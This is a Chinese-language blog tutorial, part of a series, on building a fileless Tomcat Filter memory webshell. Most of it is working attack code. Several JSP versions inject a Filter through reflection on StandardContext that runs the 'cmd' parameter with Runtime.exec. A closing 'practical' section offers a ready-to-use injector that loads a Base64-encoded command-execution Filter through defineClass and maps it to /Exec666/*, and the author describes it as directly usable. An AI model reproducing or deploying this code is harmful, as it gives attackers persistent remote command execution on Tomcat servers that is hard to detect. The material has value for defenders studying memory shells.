---
layout: post
date: 2025-6-25
title: "Tomcat内存马系列2-Filter-内存马"
author: "XinYiSleep"
category: Java
---
<h1 id="X26fk">一基础信息</h1>

```
其实早该Filter了，我是懒得写，我强烈建议Tomcat内存马系列一起看，没看的话先看一下之前Listener内存马的实现，
首先先来学习一下Filter(过滤器)用来进行权限验证，编码设置等，我看了网上的文章我自己感觉讲的有点复杂了，下面我会用我自己的理解来简化代码实现内存马，
首先老规矩先导入Tomcat的包(代码一)。
```
```java
        <dependency>
            <groupId>org.apache.tomcat</groupId>
            <artifactId>tomcat-catalina</artifactId>
            <version>8.5.54</version>
        </dependency>
        <dependency>
            <groupId>org.javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.30.2-GA</version>
        </dependency>
```
<h1 id="pvc6M">二.Filter生命周期</h1>

```
首先我们了解一下，客户端到数据库整个程序的过程(图一)，看不懂我就讲给你听，很简单就是当客户端发起请求先经过Listener在到今天我们要学习的Filter最后到Servlet
,这也就是Tomcat的web核心三大组件，知道这个之后我们看看Filter,先创建一个Filter(代码一)(代码二)，可以看到还是很简单的吧,运行之后首先执行初始化方法init,
接着请求执行doFilter,结束程序执行销毁方法，这就是Filter的声明周期。
```

![](https://xinyisleep.github.io/img/2025/Webshell/Filter/1.png)

```java
import javax.servlet.*;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

public class Filters implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("初始化");
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletResponse servletRequest1 = (HttpServletResponse) servletResponse;
        System.out.println("过滤器");
        servletRequest1.getWriter().println("代码实现");
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {
        System.out.println("销毁咯");
    }
}

```

```java
//web.xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <filter>
        <filter-name>filters</filter-name>
        <filter-class>com.example.filter.Filters</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>filters</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
</web-app>

```
<h1 id="hjdTG">三.Filter内存马思路分析</h1>

```
上面我讲了使用简化的代码让大家理解，但是存在弊端就是你不够深度理解他，所以我先使用半简化让大家理解，之后在使用更简化一笔带过，
是不是燃起来了？ok我们开始讲，首先我们把断点下在doFilter上面，接着我们往上走在filters属性中存在两个Filter(图一),
0代表是我们自己的1代表的是Tomcat自带的，查看context上下文中三个属性分别是：

filterDefs：需要类的实例，名字，类名。

filterMaps：需要名字，路径。

filterConfigs：需要一些配置信息。
```

![](https://xinyisleep.github.io/img/2025/Webshell/Filter/2.png)

```
下面我们看看这三个属性，看看他里面到底需要什么(图一)filterDefs很明显是一个hashmap，
图二就是filterMaps就是他需要修改的地方，图三就是filterConfigs的。
```

![](https://xinyisleep.github.io/img/2025/Webshell/Filter/3.png)

![](https://xinyisleep.github.io/img/2025/Webshell/Filter/4.png)

![](https://xinyisleep.github.io/img/2025/Webshell/Filter/5.png)

```
我们需要一步步修改这三个属性，先整StandardContext类filterDefs属性(图一)，找找哪里可以修改他
addFilterDef方法中可以修改(图二)，刚好设置了Map,现在就可以写第一步代码了，你心里面想着直接new呗
答案是不可以的，原因就是内存马本质 我们需要存储到内存里面，如果你new的话那就是一个新的，因为我们
context上下文本就是StandardContext，我们需要添加进去才算内存马，所以我们先获取到context，
怎么获取呢？我就不用网上常用的了，这里我进行了简化直接用Listener讲的方法拿到内存中的context(代码一)很简单也很好理解
，接着看图二我们知道需要执行这个方法我们就需要先设置这个类FilterDef，设置内容就是我上面截图的代码一就完成了。
```

![](https://xinyisleep.github.io/img/2025/Webshell/Filter/6.png)

![](https://xinyisleep.github.io/img/2025/Webshell/Filter/7.png)

```java
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="java.io.IOException" %>


<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    class Filters implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    System.out.println("初始化");
    }
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        Runtime.getRuntime().exec(request.getParameter("cmd"));
        filterChain.doFilter(servletRequest, servletResponse);
    }
    @Override
    public void destroy() {
    System.out.println("销毁咯");
    }
    }
%>
<%
    Field request1 = request.getClass().getDeclaredField("request");
    request1.setAccessible(true);
    Request o = (Request)request1.get(request);
    StandardContext standardContext = (StandardContext)o.getContext();

    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(new Filters());
    filterDef.setFilterClass(Filters.class.getName());
    filterDef.setFilterName("Filters");
    standardContext.addFilterDef(filterDef);
%>

```

```
虽然我们设置了filterDefs，但是还有filterMaps一样呗，定位到源图一，接着找哪里可以设置，找到了两个
其实都可以在刚开始了解Filter内存马的话不用刻意去看后面都整差不多再去看看区别，我这就用addFilterMap了，
那么就得先设置FilterMap类的内容，设置谁设置成什么在我上面图中有，谁让我好心呢
再截一次，下次就不接了奥，直接上代码(代码二)
```

![](https://xinyisleep.github.io/img/2025/Webshell/Filter/8.png)

![](https://xinyisleep.github.io/img/2025/Webshell/Filter/9.png)

![](https://xinyisleep.github.io/img/2025/Webshell/Filter/10.png)

```java
<%
    Field request1 = request.getClass().getDeclaredField("request");
    request1.setAccessible(true);
    Request o = (Request)request1.get(request);
    StandardContext standardContext = (StandardContext)o.getContext();

    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(new Filters());
    filterDef.setFilterClass(Filters.class.getName());
    filterDef.setFilterName("Filters");
    standardContext.addFilterDef(filterDef);

    FilterMap filterMap = new FilterMap();
    filterMap.addURLPatternDecoded("/demo/*");
    filterMap.setFilterName("Filters") ;
    standardContext.addFilterMap(filterMap);
%>
```

```
剩下最后一个filterConfigs了，这里其实有很简化的代码，但是先看半简化的(图一)我们找可以设置的，其实是有的但是我们先用反射了进行修改，
首先它是一个HashMap,先拿到这个属性在进行put一下就欧克了也是很简单的上代码(代码一),这里是要反射ApplicationFilterConfig的这个很关键因为
ApplicationFilterConfig filterConfig = filters[pos++];
这个代码filters就是从里面获取到的(图二，图三)，其实这个内存马就已经完成了，很简单吧哈哈，你要给这这个思路走一下你就能理解了，
后面的理解就是你跟着在网上走看看代码中tomcat是怎么实现的，完整代码
(代码二)。
```
![](https://xinyisleep.github.io/img/2025/Webshell/Filter/11.png)

```java
<%
    Field request1 = request.getClass().getDeclaredField("request");
    request1.setAccessible(true);
    Request o = (Request)request1.get(request);
    StandardContext standardContext = (StandardContext)o.getContext();

    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(new Filters());
    filterDef.setFilterClass(Filters.class.getName());
    filterDef.setFilterName("Filters");
    standardContext.addFilterDef(filterDef);

    FilterMap filterMap = new FilterMap();
    filterMap.addURLPatternDecoded("/demo/*");
    filterMap.setFilterName("Filters") ;
    standardContext.addFilterMap(filterMap);
    try {
        Class<?> aClass = Class.forName("org.apache.catalina.core.StandardContext");
        Field filterConfigs = aClass.getDeclaredField("filterConfigs");
        filterConfigs.setAccessible(true);
        Map<String, ApplicationFilterConfig> map = (Map<String, ApplicationFilterConfig>)filterConfigs.get(standardContext);

        Class<?> aClass1 = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
        Constructor<?> declaredConstructor = aClass1.getDeclaredConstructor(Context.class, FilterDef.class);
        declaredConstructor.setAccessible(true);
        ApplicationFilterConfig o1 = (ApplicationFilterConfig)declaredConstructor.newInstance(standardContext, filterDef);
        map.put("Filterss", o1);
    }catch (Exception e){
        e.printStackTrace();
    }

%>

```

![](https://xinyisleep.github.io/img/2025/Webshell/Filter/12.png)

![](https://xinyisleep.github.io/img/2025/Webshell/Filter/13.png)

```java
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.util.Map" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    class Filtersss implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    System.out.println("初始化");
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        Runtime.getRuntime().exec(request.getParameter("cmd"));
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {
    System.out.println("销毁咯");
    }
    }

%>
<%
    Field request1 = request.getClass().getDeclaredField("request");
    request1.setAccessible(true);
    Request o = (Request)request1.get(request);
    StandardContext standardContext = (StandardContext)o.getContext();

    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(new Filtersss());
    filterDef.setFilterClass(Filtersss.class.getName());
    filterDef.setFilterName("Filtersss");
    standardContext.addFilterDef(filterDef);

    FilterMap filterMap = new FilterMap();
    filterMap.addURLPatternDecoded("/demo/*");
    filterMap.setFilterName("Filtersss") ;
    standardContext.addFilterMap(filterMap);
    try {
        Class<?> aClass = Class.forName("org.apache.catalina.core.StandardContext");
        Field filterConfigs = aClass.getDeclaredField("filterConfigs");
        filterConfigs.setAccessible(true);
        Map<String, ApplicationFilterConfig> map = (Map<String, ApplicationFilterConfig>)filterConfigs.get(standardContext);

        Class<?> aClass1 = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
        Constructor<?> declaredConstructor = aClass1.getDeclaredConstructor(Context.class, FilterDef.class);
        declaredConstructor.setAccessible(true);
        ApplicationFilterConfig o1 = (ApplicationFilterConfig)declaredConstructor.newInstance(standardContext, filterDef);
        map.put("Filtersss", o1);
    }catch (Exception e){
        e.printStackTrace();
    }

%>

```

```
虽说上面已经是简化过的了，其实还有更简化的，我们还记得在找有没有设置filterConfigs属性的方法，其实是有的，
方法内容和我们上面进行反射差不多，不过他是new的，为啥他可以new因为这个属性和方法本身就是StandardContext类下面的(图一)，
是不是就简化很多了？没错的，我们最终简化的代码(代码一)。
```

![](https://xinyisleep.github.io/img/2025/Webshell/Filter/14.png)

```java
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.util.Map" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    class Filtersss implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    System.out.println("初始化");
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        Runtime.getRuntime().exec(request.getParameter("cmd"));
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {
    System.out.println("销毁咯");
    }
    }

%>
<%
    Field request1 = request.getClass().getDeclaredField("request");
    request1.setAccessible(true);
    Request o = (Request)request1.get(request);
    StandardContext standardContext = (StandardContext)o.getContext();

    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(new Filtersss());
    filterDef.setFilterClass(Filtersss.class.getName());
    filterDef.setFilterName("Filtersss");
    standardContext.addFilterDef(filterDef);

    FilterMap filterMap = new FilterMap();
    filterMap.addURLPatternDecoded("/demo/*");
    filterMap.setFilterName("Filtersss") ;
    standardContext.addFilterMap(filterMap);

    standardContext.filterStart();
%>

```

```
上面代码实际上也就几行代码就实现了Filter内存马了，当你把上面理解了之后就可以自己看看深层代码过程了，好了Filter内存马就结束了，
不要光看动手也试试呗，学到就是自己的，溜溜球了。
```

<h1 id="SR16t">四.Filter内存马实战</h1>

```
jsp就不多讲了基本就是文件上传，但是依旧需要文件落地，其实就是借助如JNDI注入或者通过反序列化在打内存马的方式，
下面我写好了可以直接用，首先需要准备一个恶意的Filiter(代码一),接着生成base64(代码二)，
再通过ClassLoader转换成可执行类执行内存马(代码三)。
```

```java
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;

public class Filters implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest servletRequest1 = (HttpServletRequest) servletRequest;
        HttpServletResponse servletResponse1 = (HttpServletResponse) servletResponse;
        String name = servletRequest1.getParameter("cmd");
        if( name!=null){
            servletResponse1.setCharacterEncoding("UTF-8");
            servletResponse1.setContentType("text/plain;charset=UTF-8");
            Process exec = Runtime.getRuntime().exec(name);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(exec.getInputStream()));
            String i;
            while ((i=bufferedReader.readLine())!=null){
                servletResponse1.getWriter().println(i);

            }
            return;
        }
        filterChain.doFilter(servletRequest,servletResponse);
        }


    @Override
    public void destroy() {
    }
}

```

```java
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;

import java.util.Base64;

public class Main {


    public static void main(String[] args) throws Exception {
        ClassPool aDefault = ClassPool.getDefault();
        CtClass listen = aDefault.get("Filters");
        byte[] bytecode = listen.toBytecode();
        String s = Base64.getEncoder().encodeToString(bytecode);
        System.out.println(s);
    }
}

```

```java
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardHost;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.Filter;
import javax.servlet.ServletRequestListener;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;

public class Webshell {


    String uri;
    String serverName;
    StandardContext standardContext;
    public Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException e) {

            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public Webshell() {
        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
        Object object;
        for (Thread thread : threads) {

            if (thread == null) {
                continue;
            }
            if (thread.getName().contains("exec")) {
                continue;
            }
            Object target = this.getField(thread, "target");
            if (!(target instanceof Runnable)) {
                continue;
            }

            try {
                object = getField(getField(getField(target, "this$0"), "handler"), "global");
            } catch (Exception e) {
                continue;
            }
            if (object == null) {
                continue;
            }
            java.util.ArrayList processors = (java.util.ArrayList) getField(object, "processors");
            Iterator iterator = processors.iterator();
            while (iterator.hasNext()) {
                Object next = iterator.next();

                Object req = getField(next, "req");
                Object serverPort = getField(req, "serverPort");
                if (serverPort.equals(-1)){continue;}
   
                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "serverNameMB");
                this.serverName = (String) getField(serverNameMB, "strValue");
                if (this.serverName == null){
                    this.serverName = serverNameMB.toString();
                }
                if (this.serverName == null){
                    this.serverName = serverNameMB.getString();
                }

                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "decodedUriMB");
                this.uri = (String) getField(uriMB, "strValue");
                if (this.uri == null){
                    this.uri = uriMB.toString();
                }
                if (this.uri == null){
                    this.uri = uriMB.getString();
                }

                this.getStandardContext();
                return;
            }
        }
    }

    public void getStandardContext() {
        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
        Object object;
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }

            if (!thread.getName().contains("StandardEngine")) {
                continue;
            }

            Object target = this.getField(thread, "target");
            if (target == null) { continue; }
            HashMap children;

            try {
                children = (HashMap) getField(getField(target, "this$0"), "children");
                StandardHost standardHost = (StandardHost) children.get(this.serverName);
                children = (HashMap) getField(standardHost, "children");
                Iterator iterator = children.keySet().iterator();
                while (iterator.hasNext()){
                    String contextKey = (String) iterator.next();
                    if (!(this.uri.startsWith(contextKey))){continue;}
                    StandardContext standardContext = (StandardContext) children.get(contextKey);

                    FilterDef filterDef = new FilterDef();
                    Filter exec = exec();
                    String name = exec.getClass().getName();
                    filterDef.setFilter(exec);
                    filterDef.setFilterClass(name);
                    filterDef.setFilterName("Filters");
                    standardContext.addFilterDef(filterDef);

                    FilterMap filterMap = new FilterMap();
                    filterMap.addURLPatternDecoded("/Exec666/*");
                    filterMap.setFilterName("Filters") ;
                    standardContext.addFilterMap(filterMap);
                    standardContext.filterStart();

                    return;
                }
            } catch (Exception e) {
                continue;
            }
            if (children == null) {
                continue;
            }
        }
    }
    public Filter exec() throws Exception {

        String Code="yv66vgAAADQAfAoAFgBGBwBHBwBICABJCwACAEoIAEsLAAMATAgATQsAAwBOCgBPAFAKAE8AUQcAUgcAUwoAVABVCgANAFYKAAwAVwoADABYCwADAFkKAFoAWwsAXABdBwBeBwBfBwBgAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAlMRmlsdGVyczsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwBhAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAEZXhlYwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAAWkBABJMamF2YS9sYW5nL1N0cmluZzsBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAD3NlcnZsZXRSZXF1ZXN0MQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEAEHNlcnZsZXRSZXNwb25zZTEBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAEbmFtZQEADVN0YWNrTWFwVGFibGUHAF4HAGIHAGMHAGQHAEcHAEgHAGUHAGYHAFIHAGcBAAdkZXN0cm95AQAKU291cmNlRmlsZQEADEZpbHRlcnMuamF2YQwAGAAZAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQADY21kDABoAGkBAAVVVEYtOAwAagBrAQAYdGV4dC9wbGFpbjtjaGFyc2V0PVVURi04DABsAGsHAG0MAG4AbwwAJwBwAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAGYMAHEAcgwAGABzDAAYAHQMAHUAdgwAdwB4BwB5DAB6AGsHAGQMACUAewEAB0ZpbHRlcnMBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQAQamF2YS9sYW5nL1N0cmluZwEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JT0V4Y2VwdGlvbgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA5zZXRDb250ZW50VHlwZQEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWACEAFQAWAAEAFwAAAAQAAQAYABkAAQAaAAAALwABAAEAAAAFKrcAAbEAAAACABsAAAAGAAEAAAAMABwAAAAMAAEAAAAFAB0AHgAAAAEAHwAgAAIAGgAAADUAAAACAAAAAbEAAAACABsAAAAGAAEAAAAPABwAAAAWAAIAAAABAB0AHgAAAAAAAQAhACIAAQAjAAAABAABACQAAQAlACYAAgAaAAABWAAFAAoAAABxK8AAAjoELMAAAzoFGQQSBLkABQIAOgYZBsYATxkFEga5AAcCABkFEgi5AAkCALgAChkGtgALOge7AAxZuwANWRkHtgAOtwAPtwAQOggZCLYAEVk6CcYAEhkFuQASAQAZCbYAE6f/6bEtKyy5ABQDALEAAAADABsAAAA2AA0AAAATAAYAFAAMABUAFwAWABwAFwAlABgALgAZADgAGgBNABwAWAAdAGcAIABoACIAcAAjABwAAABmAAoAOAAwACcAKAAHAE0AGwApACoACABVABMAKwAsAAkAAABxAB0AHgAAAAAAcQAtAC4AAQAAAHEALwAwAAIAAABxADEAMgADAAYAawAzADQABAAMAGUANQA2AAUAFwBaADcALAAGADgAAAAtAAP/AE0ACQcAOQcAOgcAOwcAPAcAPQcAPgcAPwcAQAcAQQAA/AAZBwA/+AAAACMAAAAGAAIAQgAkAAEAQwAZAAEAGgAAACsAAAABAAAAAbEAAAACABsAAAAGAAEAAAAoABwAAAAMAAEAAAABAB0AHgAAAAEARAAAAAIARQ==";
        byte[] decode = Base64.getDecoder().decode(Code);
        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
        Method declaredMethod1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        declaredMethod1.setAccessible(true);
        Class invoke = (Class)declaredMethod1.invoke(contextClassLoader,  decode, 0, decode.length);
        Filter o = (Filter) invoke.newInstance();
        return o;


    }
}

```
